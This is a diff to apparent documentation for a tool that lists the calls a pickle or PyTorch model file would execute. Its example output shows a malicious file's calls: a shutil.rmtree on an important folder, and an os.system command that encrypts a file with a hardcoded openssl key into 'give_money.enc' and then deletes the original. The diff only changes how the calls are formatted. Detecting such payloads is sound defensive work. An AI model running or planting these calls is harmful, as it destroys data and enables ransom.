@@ -23,12 +23,12 @@ for c in result.calls:
 ```
 and it seems like someone tried to delete something and ransom a file
 ```
-> shutil.rmtree(('/very/important/folder')
+> shutil.rmtree(('/very/important/folder'), {})
 > collections.OrderedDict((), {})
 > torch._utils._rebuild_tensor_v2((None, 0, (1000,), (1,), False, collections.OrderedDict((), {})), {})
 ...
 > torch._utils._rebuild_tensor_v2((None, 0, (), (), False, collections.OrderedDict((), {})), {})
-> os.system('openssl enc -aes-128-ecb -in important_file -out give_money.enc -K 1337B00B135DEADBEEF; rm important_file')
+> os.system(('openssl enc -aes-128-ecb -in important_file -out give_money.enc -K 1337B00B135DEADBEEF; rm important_file'), {})
 > numpy.dtype(('f8', False, True), {})
 > numpy.dtype.__setstate__(((3, '<', None, None, None, -1, -1, 0),), {})
 > _codecs.encode(('ñhã\x88µøÔ>', 'latin1'), {})
